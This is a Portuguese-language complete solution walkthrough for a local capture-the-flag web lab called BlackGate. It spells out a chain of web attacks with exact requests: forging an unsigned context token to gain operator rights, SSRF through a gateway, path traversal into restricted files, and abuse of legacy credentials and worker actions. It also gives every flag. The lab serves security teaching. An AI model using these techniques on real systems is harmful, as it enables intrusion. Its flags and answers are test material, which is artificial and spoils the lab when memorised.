# Lab 5 — BlackGate Walkthrough

Este walkthrough e spoiler completo. Ele descreve a resolucao como uma exploracao manual com navegador, proxy HTTP e repeater. Os exemplos usam nomes de rotas, parametros e valores que voce deve reproduzir no Repeater ou em uma ferramenta equivalente.

O caminho por terminal fica concentrado em `VALIDATION.md`. Aqui, o objetivo e mostrar como pensar e atravessar o labirinto.

## Visao geral

BlackGate e um boss final com uma cadeia longa:

```text
guest -> analyst/operator context -> gateway -> files vault -> legacy realm -> reports -> worker -> approval final
```

A conta inicial tem pouca visibilidade. O lab espera que voce:

- comece pela interface;
- compare papeis e respostas;
- descubra que sessao web e contexto operacional sao coisas diferentes;
- use um token fraco de contexto;
- atravesse o gateway simulado;
- leia documentos do Files Vault;
- separe credenciais falsas de credenciais do realm correto;
- abuse do fluxo de reports;
- processe um job no worker;
- reconcilie o estado de approval;
- finalize a cadeia.

## Preparacao

1. Suba o lab:

```bash
cd lab-05-blackgate
docker compose up --build
```

2. Acesse no navegador:

```text
http://localhost:8096
```

3. Configure um proxy HTTP, como Burp Suite, OWASP ZAP ou Caido.
4. Use o Repeater para repetir requests e testar pequenas variacoes.
5. Comece com a credencial publica:

```text
guest / guest123
```

Guarde cookies, headers interessantes e respostas JSON. Este lab recompensa anotacao cuidadosa.

## Fase 1 — Recon visual inicial

1. Entre com a conta `guest`.
2. Observe o menu. Ele mostra somente Dashboard, Tickets e Assets.
3. Va ao Dashboard e leia os cards. A visao e limitada, sem mapa completo.
4. Abra Tickets. O guest enxerga apenas uma fila reduzida.
5. Abra Assets. A visao tambem e sanitizada.
6. Anote o que aparece e, principalmente, o que nao aparece.
7. Tente acessar manualmente rotas operacionais obvias pelo navegador. Para `guest`, elas retornam acesso restrito.

O ponto da fase e perceber que a interface inicial e uma janela parcial. O lab nao comeca por uma conta privilegiada; ele comeca por uma conta comum e exige progressao por contexto.

Pistas importantes:

- a aplicacao tem roles;
- a UI muda por role;
- tickets e assets sao pistas, nao so tabelas;
- status codes diferentes ajudam a separar "nao existe" de "existe, mas voce nao ve".

## Fase 2 — Comparacao de papeis

Esta parte e spoiler porque usa contas que nao ficam expostas na tela publica.

1. Saia da conta `guest`.
2. Entre como:

```text
analyst / analyst123
```

3. Observe que o menu ganha `Context`.
4. Abra `Context`. A pagina existe, mas e limitada. Ela nao entrega header, payload ou instrucao ofensiva.
5. Saia e entre como:

```text
operator / operator123
```

6. Observe que a superficie cresce: Dashboard, Context, Gateway, Legacy, Files Vault, Tickets, Assets e Health.
7. Abra essas telas e compare linguagem, nomes internos e mensagens de migracao.

Conclusao da fase:

- `guest` e a identidade publica inicial.
- `analyst` ajuda a perceber que `Context` existe.
- `operator` mostra a superficie operacional.
- Ver uma superficie nao significa controlar o fluxo interno.

O lab separa visao de interface, sessao web e contexto operacional. Essa separacao vira o centro da Fase 3.

## Fase 3 — Contexto operacional

1. Volte para a conta `guest`.
2. No proxy, observe requests autenticados.
3. Procure endpoints relacionados a contexto. Um caminho natural e consultar a propria visao de contexto por API:

```text
GET /api/context/me
```

4. A resposta retorna dados de contexto e um `context_token`.
5. Copie o token e decodifique como Base64URL. Ele nao e um JWT assinado; e JSON codificado.
6. Compare os campos com a sessao web. Voce deve ver algo conceitualmente parecido com:

```json
{
  "user": "guest",
  "role": "guest",
  "scope": "limited",
  "issued_by": "legacy-context-service"
}
```

7. A fraqueza e que o token nao tem assinatura. Altere o JSON para contexto operacional:

```json
{
  "user": "guest",
  "role": "operator",
  "scope": "operations",
  "issued_by": "legacy-context-service"
}
```

8. Reencode em Base64URL.
9. No Repeater, envie:

```text
GET /api/operator/briefing
Cookie: sua sessao de guest
X-BG-Context: <token alterado>
```

10. A resposta confirma que a validacao aceitou contexto operacional elevado.

Flag da Fase 3:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

Por que importa:

- a sessao web continua sendo `guest`;
- o contexto operacional foi aceito como `operator`;
- as proximas APIs confiam nesse contexto.

## Fase 4 — Gateway trust

1. Mantenha a sessao web de `guest`.
2. Mantenha o header `X-BG-Context` com o token operacional.
3. No Repeater, consulte metadados do gateway:

```text
GET /api/operator/gateway-metadata
X-BG-Context: <token operator>
```

4. A resposta aponta candidatos internos e um fluxo de gateway.
5. Teste primeiro um alvo simples, como health de um servico interno:

```text
GET /api/operator/gateway-fetch?url=http%3A%2F%2Fapi-core.internal%2Fhealth
X-BG-Context: <token operator>
```

6. Se health responder, teste metadata do mesmo host:

```text
GET /api/operator/gateway-fetch?url=http%3A%2F%2Fapi-core.internal%2Fmetadata
X-BG-Context: <token operator>
```

7. A metadata interna mostra que requisicoes originadas pelo gateway recebem confianca diferente de requisicoes diretas.

Flag da Fase 4:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

Pista para a proxima fase:

- `api-core.internal` menciona o Files Vault;
- o gateway aceita uma allowlist de hosts internos;
- o parametro `url` deve ser URL-encoded quando contiver outros parametros.

## Fase 5 — Files Vault

1. Use o mesmo request de gateway.
2. Comece pelo endpoint simples:

```text
http://files-vault.internal/metadata
```

via:

```text
GET /api/operator/gateway-fetch?url=<URL encoded>
X-BG-Context: <token operator>
```

3. Leia a resposta. Ela fala de catalogo, leitura controlada e compatibilidade legada.
4. Consulte o catalogo:

```text
http://files-vault.internal/catalog
```

5. Leia os documentos publicos primeiro. Isso ensina o formato esperado de `read`.
6. Teste uma leitura publica normal:

```text
http://files-vault.internal/read?path=/public/notices/migration-note.txt
```

7. Tente um path restrito direto. Ele deve falhar:

```text
http://files-vault.internal/read?path=/restricted/phase5-seed.txt
```

8. Compare o erro com uma leitura que comeca no prefixo publico e depois normaliza para restrito:

```text
http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt
```

9. A diferenca entre path bruto e path normalizado e a falha da fase.

Flag da Fase 5:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

Por que importa:

- o allowlist check considera uma forma do path;
- a leitura final resolve outra forma;
- documentos restritos passam a alimentar a Fase 6.

## Fase 6 — Legacy realm

1. Continue usando gateway + contexto operator.
2. Leia documentos restritos relacionados a migracao e painel legado. Caminhos importantes aparecem por correlacao entre catalogo, notas e respostas do gateway.
3. Alguns documentos contem blocos de credenciais antigas. Nao confie no primeiro bloco.
4. Teste candidatos no legacy realm pelo gateway. O formato e:

```text
http://legacy-panel.internal/auth?user=<usuario>&pass=<senha>
```

5. Decoys esperados:

- contas espelhadas do login publico;
- usuarios admin obvios;
- contas desativadas;
- credenciais antigas de migracao.

6. A diferenca essencial: o login publico do BlackGate e o maintenance realm legado nao usam o mesmo provedor.
7. A credencial correta e:

```text
svc_migration / migrate-yellow-gate
```

8. Use no auth legado:

```text
http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate
```

9. A resposta entrega a legacy session:

```text
bg6-legacy-session-migration
```

10. Com essa session, acesse maintenance:

```text
http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration
```

Flag da Fase 6:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

O que conectar:

- public login nao e maintenance realm;
- credenciais antigas podem ser decoy;
- a session legada sera reutilizada nos reports.

## Fase 7 — Reports

1. Com a legacy session, explore a area de reports pelo gateway:

```text
http://legacy-panel.internal/reports?session=bg6-legacy-session-migration
```

2. Liste templates:

```text
http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration
```

3. Compare templates comuns com templates citados em documentos restritos.
4. Teste preview de templates comuns. Eles funcionam, mas nao entregam a fase.
5. Teste preview ou create com `worker-diagnostics` e observe as mensagens:

- preview nao e suficiente;
- renderizacao sincrona e bloqueada;
- escopo interno exige fila;
- fila errada cria job sem revisao util.

6. A combinacao correta cria um job de diagnostics em modo de fila:

```text
http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only
```

7. Envie pelo gateway-fetch no Repeater, sempre URL-encoded.
8. A resposta cria o job correto:

```text
bg7-job-worker-diagnostics
```

Flag da Fase 7:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Pistas para a proxima fase:

- job criado nao e processado imediatamente;
- worker fica em outro modulo;
- fila correta e `maintenance-worker`.

## Fase 8 — Worker

1. Use a legacy session e o job da Fase 7.
2. Explore endpoints do worker:

```text
http://legacy-panel.internal/worker/status?session=bg6-legacy-session-migration
http://legacy-panel.internal/worker/queue?session=bg6-legacy-session-migration
http://legacy-panel.internal/worker/jobs?session=bg6-legacy-session-migration
```

3. Consulte o job diretamente:

```text
http://legacy-panel.internal/worker/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration
```

4. Teste acoes normais no processor. `status` e `checksum` ajudam a entender o perfil, mas nao fecham a fase.
5. Teste acoes bloqueadas. `exec`, `shell` e `callback` devem falhar.
6. A pista vem dos documentos de diagnostics: validacao por prefixo em acoes `trace`.
7. `trace` simples funciona parcialmente. `trace:internal` aponta que falta revisao de fila.
8. A acao que cruza a validacao fraca e:

```text
trace:internal:queue
```

9. Processe o job:

```text
http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1
```

Flag da Fase 8:

```text
FLAG{blackgate_worker_processing_abuse_phase8}
```

Guarde os campos retornados:

```text
review_id: BG-REV-9041
trace_marker: qtrace-9041
queue_ref: maintenance-worker:bg7-job-worker-diagnostics
```

Esses tres valores sao a ponte para approval.

## Fase 9 — Approval final

1. Nao tente finalizar direto. Primeiro leia as notas restritas de approval no Files Vault.
2. Use o mesmo bypass controlado da Fase 5 para documentos como:

```text
/public/../restricted/final-review-notes.txt
/public/../restricted/approval-reconciliation.txt
/public/../restricted/admin-approval-policy.txt
```

3. As notas explicam tres ideias:

- approval depende de trace de fila;
- `review_id`, `trace_marker` e `queue_ref` precisam bater;
- public admin nao e finalizer suficiente.

4. Consulte a tela base de approval pelo gateway:

```text
http://legacy-panel.internal/approval?session=bg6-legacy-session-migration
```

5. Consulte status sem review e com review:

```text
http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration
http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration&review_id=BG-REV-9041
```

6. O status correto ainda nao e finalizavel. Falta reconciliation.
7. Teste decoys de reconciliation para confirmar cada validacao:

- review errado;
- trace marker errado;
- queue_ref errado;
- metadata incompleta.

8. Reconciliation correta:

```text
http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics
```

9. A resposta entrega:

```text
bg9-reconciled-BG-REV-9041
```

10. Agora teste finalizers errados:

- `admin` falha porque identidade publica nao basta;
- `operator` falha porque contexto operacional nao e o finalizer correto;
- token errado falha.

11. Finalize com o estado reconciliado e o finalizer correto:

```text
http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=maintenance
```

Flag final:

```text
FLAG{blackgate_final_admin_approval_boss_chain}
```

Estado final esperado:

```text
state: finalized
finalizer: maintenance
complete: true
```

## Decoys e armadilhas

- `robots.txt` e obvio, mas pouco util sozinho.
- Sitemap e mapas de rota mostram apenas uma parte da historia.
- `/api/routes` e parcial.
- Client config e sanitizado.
- Health valida servico, mas nao resolve fase.
- Templates comuns de reports nao dao flag.
- Jobs em fila errada parecem sucesso parcial.
- Credenciais antigas sao decoy.
- Public login nao serve para maintenance realm.
- Finalizer `admin` falha.
- Action `exec` falha.
- `trace` parcial nao basta; o campo util vem do trace de fila.
- Approval status sozinho nao finaliza.

## Resumo da cadeia

```text
1. Entrar como guest.
2. Reconhecer que a UI e limitada.
3. Comparar roles e notar Context.
4. Descobrir token de contexto fraco.
5. Forjar contexto operator.
6. Usar contexto operator para acessar APIs operacionais.
7. Passar pelo gateway para metadata interna.
8. Usar Files Vault e diferenca de normalizacao de path.
9. Encontrar a credencial correta do maintenance realm.
10. Obter legacy session.
11. Criar job worker-diagnostics em maintenance-worker.
12. Processar trace interno de fila.
13. Correlacionar review_id, trace_marker e queue_ref.
14. Reconciliar approval.
15. Finalizar com maintenance.
```

## Flags confirmadas

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
FLAG{blackgate_legacy_credential_reuse_phase6}
FLAG{blackgate_report_workflow_abuse_phase7}
FLAG{blackgate_worker_processing_abuse_phase8}
FLAG{blackgate_final_admin_approval_boss_chain}
```
